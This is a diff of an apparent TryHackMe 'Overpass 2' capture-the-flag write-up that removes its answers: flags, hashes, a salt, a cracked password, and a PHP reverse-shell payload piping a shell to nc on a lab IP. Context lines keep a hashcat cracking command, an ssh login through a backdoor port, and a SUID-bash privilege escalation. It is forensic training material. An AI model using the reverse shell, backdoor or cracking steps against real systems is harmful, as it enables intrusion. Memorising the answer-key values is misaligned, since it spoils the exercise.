@@ -20,7 +20,6 @@ wireshark overpass2.pcap
     using the /development section intended for uploading .overpass files
 \\
 What was the URL of the page they used to upload a reverse shell?
-/development
 //
   - Next we need to figure out what payload the attacker used to gain
     access
@@ -29,7 +28,6 @@ What was the URL of the page they used to upload a reverse shell?
     php script to inject code and gain shell. This is also our flag.
 \\
 What payload did the attacker use to gain access?
-<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
 //
   - Next we should find what password the attacker used to priv escalate
   - Scroll down in Wireshark. You can see on line 34-36 the attacker lines are
@@ -41,7 +39,6 @@ What payload did the attacker use to gain access?
     flag.
 \\
 How did the attacker establish persistence?
-https://github.com/NinjaJc01/ssh-backdoor
 //
   - Let's go ahead and attempt to crack these hashes ourselves. Copy/paste the
     hashes into .txt files. I labeled mine h1.txt, h2.txt .. etc.
@@ -66,7 +63,6 @@ muirland:1qaz2wsx:18464:0:99999:7:::
 
 \\
 Using the fasttrack wordlist, how many of the system passwords were crackable?
-4
 //
 
         Task 2
@@ -78,7 +74,6 @@ Now that you've found the code for the backdoor, it's time to analyze it.
     when the attacker runs "backdoor"
 \\
 What was the hash the attacker used? - go back to the PCAP for this!
-6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
 //
   - It's a good idea to git clone the same ssh-backdoor binary that the
     attacker used in order to figure out how exactly the attacker operated.
@@ -96,12 +91,10 @@ gedit(or text editor of your choice) main.go
     This is going to be the answer to flag 1.
 \\
 What's the default hash for the backdoor?
-bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
 //
     We can also see the hardcoded salt in the very last line of code.
 \\
 What's the hardcoded salt for the backdoor?
-1c362db832f3f864c8c2fe05f2002a05
 //
     Now that we have the salt, we can crack the hash.
     We'll use hashcat for this as it's got an easy way to specify salt on
@@ -114,12 +107,11 @@ What's the hardcoded salt for the backdoor?
 
 hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" --force /usr/share/wordlists/rockyou.txt
 
-    After a little while hashcat will return the cracked password: november16
+    After a little while hashcat will return the cracked password,
     which completes our final flag for this section.
 \\
 Crack the hash using rockyou and a cracking tool of your choice. What's the
 password?
-november16
 //
 
         Task 3
@@ -141,12 +133,11 @@ nmap -sC -sV $IP
   - In another terminal window, using some of the information we learned from
     the ssh backdoor script, we can gain access into the system.
     We know that the port will be 2222 as that's the default port set in the
-    main.go file. We also have the password that we cracked with hashcat:
-    november16
+    main.go file. We also have the password that we cracked with hashcat.
 
 ssh -p 2222 james@10.10.91.182
 yes
-james@10.10.91.182's password: november16
+james@10.10.91.182's password:
 
   - Now we're in. Let's go to the desktop and try to find the user.txt.
 
@@ -155,7 +146,6 @@ ls -la
 cat user.txt
 \\
 What's the user flag?
-thm{d119b4fa8c497ddb0525f7ad200e6567}
 //
   - We can also see here a reg highlight on .suid_bash This means that as
     the user james, we've got rwx access to it. Run ./.suid_bash -p
@@ -169,7 +159,6 @@ root
 
 \\
 What's the root flag?
-thm{d53b2684f169360bb9606c333873144d}
 //
 
   And there we go, we've finished the box!
